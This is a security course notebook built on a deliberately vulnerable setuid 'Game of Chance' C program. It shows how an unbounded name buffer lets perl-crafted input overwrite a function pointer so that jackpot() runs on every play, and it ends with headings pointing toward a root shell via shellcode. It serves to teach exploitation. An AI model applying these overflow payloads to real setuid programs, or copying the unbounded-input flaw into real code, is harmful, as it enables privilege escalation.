# Overflowing Function Pointers
- recall function pointers are pointers that store addresses of functions/code
    - see CFundamentals Notebooks for a review
- function pointers can be overwritten using overflow techniques to point to different code/function

## game of chance
- hacking book provides game_of_chance.c program
- program uses a function pointer to remember the last game played
- the pointer is stored in the **user** structure
- player is declared as an uninitialized global variable
    - meaning the memory is allocated in the **bss** segment
    
- copy, examine, compile and run game_of_change.c program

## Note: user is password for current user running notebook with sudo priviledge


```python
! cp ./boosrc/compile.sh .
! cp ./booksrc/game_of_chance.c .
! cp ./booksrc/hacking.h . # hacking.h is untility header file
```

    cp: cannot stat './boosrc/compile.sh': No such file or directory



```python
! cat game_of_chance.c
```

    #include <stdio.h>
    #include <string.h>
    #include <fcntl.h>
    #include <sys/stat.h>
    #include <time.h>
    #include <stdlib.h>
    #include "hacking.h"
    
    #define DATAFILE "/var/chance.data" // File to store user data
    
    // Custom user struct to store information about users
    struct user {
       int uid;
       int credits;
       int highscore;
       char name[100];
       int (*current_game) ();
    };
    
    // function prototypes
    int get_player_data();
    void register_new_player();
    void update_player_data();
    void show_highscore();
    void jackpot();
    void input_name();
    void print_cards(char *, char *, int);
    int take_wager(int, int);
    void play_the_game();
    int pick_a_number();
    int dealer_no_match();
    int find_the_ace();
    void fatal(char *);
    
    // Global variables
    struct user player;      // Player struct
    
    int main() {
       int choice, last_game;
    
       srand(time(0)); // Seed the randomizer with the current time.
       
       if(get_player_data() == -1) // Try to read player data from file.
          register_new_player();    // If there is no data, register a new player.
       
       while(choice != 7) {
          printf("-=[ Game of Chance Menu ]=-\n");
          printf("1 - Play the Pick a Number game\n");
          printf("2 - Play the No Match Dealer game\n");
          printf("3 - Play the Find the Ace game\n");
          printf("4 - View current high score\n");
          printf("5 - Change your user name\n");
          printf("6 - Reset your account at 100 credits\n");
          printf("7 - Quit\n");
          printf("[Name: %s]\n", player.name);
          printf("[You have %u credits] ->  ", player.credits);
          scanf("%d", &choice);
    
          if((choice < 1) || (choice > 7))
             printf("\n[!!] The number %d is an invalid selection.\n\n", choice);
          else if (choice < 4) {  // Othewise, choice was a game of some sort.
                if(choice != last_game) { // If the function ptr isn't set
                   if(choice == 1)        // then point it at the selected game 
                      player.current_game = pick_a_number;   
                   else if(choice == 2)                     
                      player.current_game = dealer_no_match;
                   else
                      player.current_game = find_the_ace;
                   last_game = choice;   // and set last_game.
                }
                play_the_game();   // Play the game.
             }
          else if (choice == 4)
             show_highscore();
          else if (choice == 5) {
             printf("\nChange user name\n");
             printf("Enter your new name: ");
             input_name();
             printf("Your name has been changed.\n\n");
          }
          else if (choice == 6) {
             printf("\nYour account has been reset with 100 credits.\n\n");
             player.credits = 100;
          }
       }
       update_player_data();
       printf("\nThanks for playing! Bye.\n");
    }
    
    // This function reads the player data for the current uid
    // from the file. It returns -1 if it is unable to find player
    // data for the current uid.
    int get_player_data() { 
       int fd, uid, read_bytes;
       struct user entry;
    
       uid = getuid();
    
       fd = open(DATAFILE, O_RDONLY);
       if(fd == -1) // Can't open the file, maybe it doesn't exist
          return -1; 
       read_bytes = read(fd, &entry, sizeof(struct user)); // Read the first chunk.
       while(entry.uid != uid && read_bytes > 0) {  // Loop until proper uid is found.
          read_bytes = read(fd, &entry, sizeof(struct user)); // Keep reading.
       }
       close(fd); // close the file
       if(read_bytes  < sizeof(struct user)) // This means that the end of file was reached.
          return -1;
       else
          player = entry; // Copy the read entry into the player struct.
       return 1; // Return a success.
    }
    
    // This is the new user registration function.
    // It will create a new player account and append it to the file
    void register_new_player()  { 
       int fd;
    
       printf("-=-={ New Player Registration }=-=-\n");
       printf("Enter your name: ");
       input_name();
    
       player.uid = getuid();
       player.highscore = player.credits = 100;
    
       fd = open(DATAFILE, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
       if(fd == -1)
          fatal("in register_new_player() while opening file");
       write(fd, &player, sizeof(struct user));
       close(fd);
    
       printf("\nWelcome to the Game of Chance %s.\n", player.name);
       printf("You have been given %u credits.\n", player.credits);
    }
    
    // This function writes the current player data to the file.
    // It is used primarily for updating the credits after games.
    void update_player_data() {
       int fd, i, read_uid;
       char burned_byte;
    
       fd = open(DATAFILE, O_RDWR);
       if(fd == -1) // If open fails here, something is really wrong.
          fatal("in update_player_data() while opening file");
       read(fd, &read_uid, 4);       // Read the uid from the first struct.
       while(read_uid != player.uid) {  // Loop until correct uid is found.
          for(i=0; i < sizeof(struct user) - 4; i++)  // Read through the
             read(fd, &burned_byte, 1);            // rest of that struct.
          read(fd, &read_uid, 4);     // Read the uid from the next struct. 
       }
       write(fd, &(player.credits), 4);   // Update credits.
       write(fd, &(player.highscore), 4); // Update highscore.
       write(fd, &(player.name), 100);    // Update name.
       close(fd);
    }
    
    // This function will display the current high score and
    // the name of the person who set that high score.
    void show_highscore() {
       unsigned int top_score = 0;
       char top_name[100];
       struct user entry;
       int fd;
    
       printf("\n====================| HIGH SCORE |====================\n");
       fd = open(DATAFILE, O_RDONLY);
       if(fd == -1)
          fatal("in show_highscore() while opening file");
       while(read(fd, &entry, sizeof(struct user)) > 0) { // Loop until end of file.
          if(entry.highscore > top_score) {   // If there is a higher score,
                top_score = entry.highscore;  // set top_score to that score
                strcpy(top_name, entry.name); // and top_name to that username.
             }
       }
       close(fd);
       if(top_score > player.highscore)
          printf("%s has the high score of %u\n", top_name, top_score);
       else
          printf("You currently have the high score of %u credits!\n", player.highscore);
       printf("======================================================\n\n");
    }
    
    // This function simply awards the jackpot for the Pick a Number game
    void jackpot() {
       printf("*+*+*+*+*+* JACKPOT *+*+*+*+*+*\n");
       printf("You have won the jackpot of 100 credits!\n");
       player.credits += 100;
    }
    
    // This function is used to input the player name, since 
    // scanf("%s", &whatever) will stop input at the first space.
    void input_name() {
       char *name_ptr, input_char='\n';
       while(input_char == '\n')    // Flush any leftover 
          scanf("%c", &input_char); // newline chars.
       
       name_ptr = (char *) &(player.name); // name_ptr = player name's address
       while(input_char != '\n') {  // Loop until newline.
          *name_ptr = input_char;   // Put the input char into name field.
          scanf("%c", &input_char); // Get the next char.
          name_ptr++;               // Increment the name pointer.
       }
       *name_ptr = 0;  // Terminate the string.
    }
    
    // This function prints the 3 cards for the Find the Ace game.
    // It expects a message to display, a pointer to the cards array,
    // and the card the user has picked as input. If the user_pick is
    // -1, then the selection numbers are displayed.
    void print_cards(char *message, char *cards, int user_pick) {
       int i;
    
       printf("\n\t*** %s ***\n", message);
       printf("      \t._.\t._.\t._.\n");
       printf("Cards:\t|%c|\t|%c|\t|%c|\n\t", cards[0], cards[1], cards[2]);
       if(user_pick == -1)
          printf(" 1 \t 2 \t 3\n");
       else {
          for(i=0; i < user_pick; i++)
             printf("\t");
          printf(" ^-- your pick\n");
       }
    }
    
    // This function inputs wagers for both the No Match Dealer and
    // Find the Ace games. It expects the available credits and the
    // previous wager as arguments. The previous_wager is only important
    // for the second wager in the Find the Ace game. The function
    // returns -1 if the wager is too big or too little, and it returns
    // the wager amount otherwise.
    int take_wager(int available_credits, int previous_wager) {
       int wager, total_wager;
    
       printf("How many of your %d credits would you like to wager?  ", available_credits);
       scanf("%d", &wager);
       if(wager < 1) {   // Make sure the wager is greater than 0.
          printf("Nice try, but you must wager a positive number!\n");
          return -1;
       }
       total_wager = previous_wager + wager;
       if(total_wager > available_credits) {  // Confirm available credits
          printf("Your total wager of %d is more than you have!\n", total_wager);
          printf("You only have %d available credits, try again.\n", available_credits);
          return -1;
       }
       return wager;
    }
    
    // This function contains a loop to allow the current game to be
    // played again. It also writes the new credit totals to file
    // after each game is played.
    void play_the_game() { 
       int play_again = 1;
       int (*game) ();
       char selection;
    
       while(play_again) {
          printf("\n[DEBUG] current_game pointer @ 0x%08x\n", player.current_game);
          if(player.current_game() != -1) { // If the game plays without error and
             if(player.credits > player.highscore)  // a new high score is set,
                player.highscore = player.credits;  // update the highscore.
             printf("\nYou now have %u credits\n", player.credits);
             update_player_data(); // Write the new credit total to file.
             printf("Would you like to play again? (y/n)  ");
             selection = '\n';
             while(selection == '\n')   // Flush any extra newlines.
                scanf("%c", &selection);
             if(selection == 'n')
                play_again = 0;
          }
          else  // This means the game returned an error,
             play_again = 0; // so return to main menu.
       }
    }
    
    // This function is the Pick a Number game.
    // It returns -1 if the player doesn't have enough credits.
    int pick_a_number() { 
       int pick, winning_number;
    
       printf("\n####### Pick a Number ######\n");
       printf("This game costs 10 credits to play. Simply pick a number\n");
       printf("between 1 and 20, and if you pick the winning number, you\n");
       printf("will win the jackpot of 100 credits!\n\n");
       winning_number = (rand() % 20) + 1; // Pick a number between 1 and 20.
       if(player.credits < 10) {
          printf("You only have %d credits. That's not enough to play!\n\n", player.credits);
          return -1;  // Not enough credits to play 
       }
       player.credits -= 10; // Deduct 10 credits
       printf("10 credits have been deducted from your account.\n");
       printf("Pick a number between 1 and 20: ");
       scanf("%d", &pick);
    
       printf("The winning number is %d\n", winning_number);
       if(pick == winning_number)
          jackpot();
       else
          printf("Sorry, you didn't win.\n");
       return 0;
    }
    
    // This is the No Match Dealer game.
    // It returns -1 if the player has 0 credits.
    int dealer_no_match() { 
       int i, j, numbers[16], wager = -1, match = -1;
    
       printf("\n::::::: No Match Dealer :::::::\n");
       printf("In this game, you can wager up to all of your credits.\n");
       printf("The dealer will deal out 16 random numbers between 0 and 99.\n");
       printf("If there are no matches among them, you double your money!\n\n");
      
       if(player.credits == 0) {
          printf("You don't have any credits to wager!\n\n");
          return -1;
       }
       while(wager == -1)
          wager = take_wager(player.credits, 0);
    
       printf("\t\t::: Dealing out 16 random numbers :::\n");
       for(i=0; i < 16; i++) {
          numbers[i] = rand() % 100; // pick a number 0 to 99
          printf("%2d\t", numbers[i]);
          if(i%8 == 7)  // Print a line break every 8 numbers.
             printf("\n");
       }
       for(i=0; i < 15; i++) {  // Loop looking for matches
          j = i + 1;
          while(j < 16) {
             if(numbers[i] == numbers[j])
                match = numbers[i];
             j++;
          }
       }
       if(match != -1) {
          printf("The dealer matched the number %d!\n", match);
          printf("You lose %d credits.\n", wager);
          player.credits -= wager;
       } else {
          printf("There were no matches! You win %d credits!\n", wager);
          player.credits += wager;
       }
       return 0;
    }
    
    // This is the Find the Ace game.
    // It returns -1 if the player has 0 credits.
    int find_the_ace() {
       int i, ace, total_wager;
       int invalid_choice, pick = -1, wager_one = -1, wager_two = -1;
       char choice_two, cards[3] = {'X', 'X', 'X'};
    
       ace = rand()%3; // Place the ace randomly.
    
       printf("******* Find the Ace *******\n");
       printf("In this game, you can wager up to all of your credits.\n");
       printf("Three cards will be dealt out, two queens and one ace.\n");
       printf("If you find the ace, you will win your wager.\n");
       printf("After choosing a card, one of the queens will be revealed.\n");
       printf("At this point, you may either select a different card or\n");
       printf("increase your wager.\n\n");
    
       if(player.credits == 0) {
          printf("You don't have any credits to wager!\n\n");
          return -1;
       }
       
       while(wager_one == -1) // Loop until valid wager is made.
          wager_one = take_wager(player.credits, 0);
    
       print_cards("Dealing cards", cards, -1);
       pick = -1;
       while((pick < 1) || (pick > 3)) { // Loop until valid pick is made.
          printf("Select a card: 1, 2, or 3  ");
          scanf("%d", &pick);
       }
       pick--; // Adjust the pick since card numbering starts at 0.
       i=0;
       while(i == ace || i == pick) // Keep looping until 
          i++;                      // we find a valid queen to reveal.
       cards[i] = 'Q';
       print_cards("Revealing a queen", cards, pick);
       invalid_choice = 1;
       while(invalid_choice) {   // Loop until valid choice is made.
          printf("Would you like to:\n[c]hange your pick\tor\t[i]ncrease your wager?\n");
          printf("Select c or i:  ");
          choice_two = '\n';
          while(choice_two == '\n') // Flush extra newlines.
             scanf("%c", &choice_two);
          if(choice_two == 'i') {   // Increase wager.
                invalid_choice=0;   // This is a valid choice.
                while(wager_two == -1)  // Loop until valid second wager is made.
                   wager_two = take_wager(player.credits, wager_one);
             }
          if(choice_two == 'c') {    // Change pick.
             i = invalid_choice = 0; // Valid choice
             while(i == pick || cards[i] == 'Q') // Loop until the other card
                i++;// is found,
             pick = i;// and then swap pick.
             printf("Your card pick has been changed to card %d\n", pick+1);
          }
       }
    
       for(i=0; i < 3; i++) {  // Reveal all of the cards.
          if(ace == i)
             cards[i] = 'A';
          else
             cards[i] = 'Q';
       }
       print_cards("End result", cards, pick);
       
       if(pick == ace) {  // handle win
          printf("You have won %d credits from your first wager\n", wager_one);
          player.credits += wager_one;
          if(wager_two != -1) {
             printf("and an additional %d credits from your second wager!\n", wager_two);
             player.credits += wager_two;
          }
       } else { // handle loss
          printf("You have lost %d credits from your first wager\n", wager_one);
          player.credits -= wager_one;
          if(wager_two != -1) {
             printf("and an additional %d credits from your second wager!\n", wager_two);
             player.credits -= wager_two;
          }
       }
       return 0;
    }



```python
! echo kali | sudo -S ./compile.sh game_of_chance.c game_of_chance
```

    [sudo] password for kali: [01m[Kgame_of_chance.c:[m[K In function ‘[01m[Kget_player_data[m[K’:
    [01m[Kgame_of_chance.c:97:10:[m[K [01;35m[Kwarning: [m[Kimplicit declaration of function ‘[01m[Kgetuid[m[K’ [[01;35m[K-Wimplicit-function-declaration[m[K]
       97 |    uid = [01;35m[Kgetuid[m[K();
          |          [01;35m[K^~~~~~[m[K
    [01m[Kgame_of_chance.c:102:17:[m[K [01;35m[Kwarning: [m[Kimplicit declaration of function ‘[01m[Kread[m[K’; did you mean ‘[01m[Kfread[m[K’? [[01;35m[K-Wimplicit-function-declaration[m[K]
      102 |    read_bytes = [01;35m[Kread[m[K(fd, &entry, sizeof(struct user)); // Read the first chunk.
          |                 [01;35m[K^~~~[m[K
          |                 [32m[Kfread[m[K
    [01m[Kgame_of_chance.c:106:4:[m[K [01;35m[Kwarning: [m[Kimplicit declaration of function ‘[01m[Kclose[m[K’; did you mean ‘[01m[Kpclose[m[K’? [[01;35m[K-Wimplicit-function-declaration[m[K]
      106 |    [01;35m[Kclose[m[K(fd); // close the file
          |    [01;35m[K^~~~~[m[K
          |    [32m[Kpclose[m[K
    [01m[Kgame_of_chance.c:[m[K In function ‘[01m[Kregister_new_player[m[K’:
    [01m[Kgame_of_chance.c:129:4:[m[K [01;35m[Kwarning: [m[Kimplicit declaration of function ‘[01m[Kwrite[m[K’; did you mean ‘[01m[Kfwrite[m[K’? [[01;35m[K-Wimplicit-function-declaration[m[K]
      129 |    [01;35m[Kwrite[m[K(fd, &player, sizeof(struct user));
          |    [01;35m[K^~~~~[m[K
          |    [32m[Kfwrite[m[K



```python
# program uses /var/chance.data to store player's information
# let's take a look into it
! echo kali | sudo -S cat /var/chance.data
```

    [sudo] password for kali: �  Z   d   Ram Basnet                                                                                              


```python
# if file exists, delete it to start fresh
! echo kali | sudo -S rm /var/chance.data
```

    [sudo] password for kali: 


```python
! echo kali | sudo -S cat /var/chance.data
```

    [sudo] password for kali: cat: /var/chance.data: No such file or directory



```python
! ls -l ./game_of_chance
```

    -rwxr-xr-x 1 root root 30764 Aug 22 21:49 ./game_of_chance



```python
# make sure game of chance is owned by root
! echo kali | sudo -S chown root:root game_of_chance
```

    [sudo] password for kali: 


```python
# the program can write to /var/ folder if it's a setuid program
! echo kali | sudo -S chmod +s ./game_of_chance
```

    [sudo] password for kali: 


```python
! ls -l ./game_of_chance
```

    -rwsr-sr-x 1 root root 30764 Aug 22 21:49 ./game_of_chance


### play the interactive game
- game_of_chance is an interactive program that doesn't work with Jupyter Notebook as of Aug. 20 2020
- Use Terminal to play the program; follow the menu provided by the program to play the game
- use CTRL-Z to temporarily suspend the current process

## Detect flaw in the game
- do code review to find global **user** object and input_name()
- note **user** struct has declared name buffer of 100 bytes
- input_name() function reads and stores into name field one character at a time until '\n'
- there's nothing to limit it to the length of the destination buffer!
- so, the game has buffer overrun/overflow vulnerability!


## Exploit the overflow flaw
- explore the memory addresses of **name** and **current_game** using peda/gdb
- use gdb to debug the live process
- find the process id of game_of_chance program that's running
```
$ ps aux | grep game_of_chance
$ sudo gdb -q --pid=process id of game_of_chance --symbols=exe with symbols
$ x/x &player.name
$ x/x &player.current_game
$ p/u (address of player.current_game) - (address of player.name)
```
- notice, **name[100]** is at a lower address
- **(\*current_game)()** is at a higher address find the exact size that would overlfow the 
- the offset should be 100
- create a string with 100As + BBBB
- detach the process from gdb and change the name with menu option 5 pasting the following buffer
- Enter 1 to play the game and the buffer should overwrite the [DEBUG] current_game pointer with 0x42424242


```python
# change the name to the following string
! perl -e 'print "A"x100 . "B"x4 . "\n"'
```

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB


### Find useful functions/code in the program
- **nm** command lists symbols in object files with corresponding addresses
    - can be used to find addresses of various functions in a program
- jackpot() is intruiging!


```python
! nm game_of_chance
# lists the symbols and corresponding 
# addresses in memory in alphabetical order
```

    0804e05c B __bss_start
             U close@@GLIBC_2.0
    0804e060 b completed.7013
    0804e054 D __data_start
    0804e054 W data_start
    08049ee2 T dealer_no_match
    080491b0 t deregister_tm_clones
    08049190 T _dl_relocate_static_pie
    08049230 t __do_global_dtors_aux
    0804df10 d __do_global_dtors_aux_fini_array_entry
    0804e058 D __dso_handle
    08049308 T dump
    0804df14 d _DYNAMIC
    080492c5 T ec_malloc
    0804e05c D _edata
    0804e0f4 B _end
             U exit@@GLIBC_2.0
    08049262 T fatal
    0804a0df T find_the_ace
    0804a518 T _fini
    0804b000 R _fp_hw
    08049260 t frame_dummy
    0804df0c d __frame_dummy_init_array_entry
    0804bf3c r __FRAME_END__
    08049682 T get_player_data
             U getuid@@GLIBC_2.0
    0804e000 d _GLOBAL_OFFSET_TABLE_
             w __gmon_start__
    0804bb3c r __GNU_EH_FRAME_HDR
    08049000 T _init
    0804df10 d __init_array_end
    0804df0c d __init_array_start
    08049abd T input_name
    0804b004 R _IO_stdin_used
             U __isoc99_scanf@@GLIBC_2.7
    08049a6c T jackpot
    0804a510 T __libc_csu_fini
    0804a4b0 T __libc_csu_init
             U __libc_start_main@@GLIBC_2.0
    08049421 T main
             U malloc@@GLIBC_2.0
             U open@@GLIBC_2.0
             U perror@@GLIBC_2.0
    08049d97 T pick_a_number
    0804e080 B player
    08049ca1 T play_the_game
    08049b38 T print_cards
             U printf@@GLIBC_2.0
             U putchar@@GLIBC_2.0
             U puts@@GLIBC_2.0
             U rand@@GLIBC_2.0
             U read@@GLIBC_2.0
    08049754 T register_new_player
    080491f0 t register_tm_clones
    0804995a T show_highscore
             U srand@@GLIBC_2.0
    08049150 T _start
             U strcpy@@GLIBC_2.0
             U strncat@@GLIBC_2.0
    08049bf8 T take_wager
             U time@@GLIBC_2.0
    0804e05c D __TMC_END__
    08049855 T update_player_data
             U write@@GLIBC_2.0
    0804a511 T __x86.get_pc_thunk.bp
    080491a0 T __x86.get_pc_thunk.bx


### scripting the interactive user input
- instead of typing options and commands interactively, they can be scripted and piped into the program
- program can then parse and use the input as if someone is interactively typing it from the std input stream
- make sure the game has been played atleast once by the current user
    - the following script needs to start with full name otherwise!


```python
# plagy game #1, Enter 10 as guessed #, n to paly again; 
# Enter 7 to quit
! perl -e 'print "1\n10\nn\n7\n"' | ./game_of_chance
```

    -=[ Game of Chance Menu ]=-
    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: Ram Basnet]
    [You have 90 credits] ->  
    [DEBUG] current_game pointer @ 0x08049d97
    
    ####### Pick a Number ######
    This game costs 10 credits to play. Simply pick a number
    between 1 and 20, and if you pick the winning number, you
    will win the jackpot of 100 credits!
    
    10 credits have been deducted from your account.
    Pick a number between 1 and 20: The winning number is 6
    Sorry, you didn't win.
    
    You now have 80 credits
    Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-
    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: Ram Basnet]
    [You have 80 credits] ->  
    Thanks for playing! Bye.



```python
# let's replace the current_game with out own data (BBBB)
! perl -e 'print "1\n10\nn\n5\n" . "A"x100 . "BBBB\n" . "1\nn\n7\n"' | ./game_of_chance
```

    -=[ Game of Chance Menu ]=-
    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: Ram Basnet]
    [You have 80 credits] ->  
    [DEBUG] current_game pointer @ 0x08049d97
    
    ####### Pick a Number ######
    This game costs 10 credits to play. Simply pick a number
    between 1 and 20, and if you pick the winning number, you
    will win the jackpot of 100 credits!
    
    10 credits have been deducted from your account.
    Pick a number between 1 and 20: The winning number is 9
    Sorry, you didn't win.
    
    You now have 70 credits
    Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-
    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: Ram Basnet]
    [You have 70 credits] ->  
    Change user name
    Enter your new name: Your name has been changed.
    
    -=[ Game of Chance Menu ]=-
    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB]
    [You have 70 credits] ->  
    [DEBUG] current_game pointer @ 0x42424242
    /bin/bash: line 1: 41563 Done                    perl -e 'print "1\n10\nn\n5\n" . "A"x100 . "BBBB\n" . "1\nn\n7\n"'
         41564 Segmentation fault      | ./game_of_chance



```python
# note the jackpot()'s address
! nm game_of_chance | grep jackpot
```

    08049a6c T jackpot



```python
# let's create a string mimicking game play with jackpot address!
! perl -e 'print "1\n19\nn\n5\n" . "A"x100 . "\x6c\x9a\x04\x08\n" . "1\nn\n7\n"'
# the following is the sequnce of user input to play the game
```

    1
    19
    n
    5
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAl�
    1
    n
    7



```python
# now let's hit the Jackpot!
! perl -e 'print "1\n19\nn\n5\n" . "A"x100 . "\x6c\x9a\x04\x08\n" . "1\nn\n7\n"' | ./game_of_chance
```

    -=[ Game of Chance Menu ]=-
    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: Ram Basnet]
    [You have 70 credits] ->  
    [DEBUG] current_game pointer @ 0x08049d97
    
    ####### Pick a Number ######
    This game costs 10 credits to play. Simply pick a number
    between 1 and 20, and if you pick the winning number, you
    will win the jackpot of 100 credits!
    
    10 credits have been deducted from your account.
    Pick a number between 1 and 20: The winning number is 1
    Sorry, you didn't win.
    
    You now have 60 credits
    Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-
    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: Ram Basnet]
    [You have 60 credits] ->  
    Change user name
    Enter your new name: Your name has been changed.
    
    -=[ Game of Chance Menu ]=-
    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAl�]
    [You have 60 credits] ->  
    [DEBUG] current_game pointer @ 0x08049a6c
    *+*+*+*+*+* JACKPOT *+*+*+*+*+*
    You have won the jackpot of 100 credits!
    
    You now have 160 credits
    Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-
    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAl�]
    [You have 160 credits] ->  
    Thanks for playing! Bye.



```python
# let's hit the Jackpot 10 times in a row!
# and change to your actual name
! perl -e 'print "1\n19\nn\n5\n" . "A"x100 . "\x6c\x9a\x04\x08\n" . "1\n" . "y\n"x10 . "n\n5\nRam Basnet\n7\n"' | ./game_of_chance
```

    -=[ Game of Chance Menu ]=-
    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
    [You have 160 credits] ->  
    [DEBUG] current_game pointer @ 0x08049d97
    
    ####### Pick a Number ######
    This game costs 10 credits to play. Simply pick a number
    between 1 and 20, and if you pick the winning number, you
    will win the jackpot of 100 credits!
    
    10 credits have been deducted from your account.
    Pick a number between 1 and 20: The winning number is 10
    Sorry, you didn't win.
    
    You now have 150 credits
    Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-
    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]
    [You have 150 credits] ->  
    Change user name
    Enter your new name: Your name has been changed.
    
    -=[ Game of Chance Menu ]=-
    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAl�]
    [You have 150 credits] ->  
    [DEBUG] current_game pointer @ 0x08049a6c
    *+*+*+*+*+* JACKPOT *+*+*+*+*+*
    You have won the jackpot of 100 credits!
    
    You now have 250 credits
    Would you like to play again? (y/n)  
    [DEBUG] current_game pointer @ 0x08049a6c
    *+*+*+*+*+* JACKPOT *+*+*+*+*+*
    You have won the jackpot of 100 credits!
    
    You now have 350 credits
    Would you like to play again? (y/n)  
    [DEBUG] current_game pointer @ 0x08049a6c
    *+*+*+*+*+* JACKPOT *+*+*+*+*+*
    You have won the jackpot of 100 credits!
    
    You now have 450 credits
    Would you like to play again? (y/n)  
    [DEBUG] current_game pointer @ 0x08049a6c
    *+*+*+*+*+* JACKPOT *+*+*+*+*+*
    You have won the jackpot of 100 credits!
    
    You now have 550 credits
    Would you like to play again? (y/n)  
    [DEBUG] current_game pointer @ 0x08049a6c
    *+*+*+*+*+* JACKPOT *+*+*+*+*+*
    You have won the jackpot of 100 credits!
    
    You now have 650 credits
    Would you like to play again? (y/n)  
    [DEBUG] current_game pointer @ 0x08049a6c
    *+*+*+*+*+* JACKPOT *+*+*+*+*+*
    You have won the jackpot of 100 credits!
    
    You now have 750 credits
    Would you like to play again? (y/n)  
    [DEBUG] current_game pointer @ 0x08049a6c
    *+*+*+*+*+* JACKPOT *+*+*+*+*+*
    You have won the jackpot of 100 credits!
    
    You now have 850 credits
    Would you like to play again? (y/n)  
    [DEBUG] current_game pointer @ 0x08049a6c
    *+*+*+*+*+* JACKPOT *+*+*+*+*+*
    You have won the jackpot of 100 credits!
    
    You now have 950 credits
    Would you like to play again? (y/n)  
    [DEBUG] current_game pointer @ 0x08049a6c
    *+*+*+*+*+* JACKPOT *+*+*+*+*+*
    You have won the jackpot of 100 credits!
    
    You now have 1050 credits
    Would you like to play again? (y/n)  
    [DEBUG] current_game pointer @ 0x08049a6c
    *+*+*+*+*+* JACKPOT *+*+*+*+*+*
    You have won the jackpot of 100 credits!
    
    You now have 1150 credits
    Would you like to play again? (y/n)  
    [DEBUG] current_game pointer @ 0x08049a6c
    *+*+*+*+*+* JACKPOT *+*+*+*+*+*
    You have won the jackpot of 100 credits!
    
    You now have 1250 credits
    Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-
    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAl�]
    [You have 1250 credits] ->  
    Change user name
    Enter your new name: Your name has been changed.
    
    -=[ Game of Chance Menu ]=-
    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: Ram Basnet]
    [You have 1250 credits] ->  
    Thanks for playing! Bye.


## Exploiting with shellcode
- as the program is setuid; it "should" give you a root shell if you can manage to smuggle and execute your shellcode!

## Stashing shellcode in environment variable
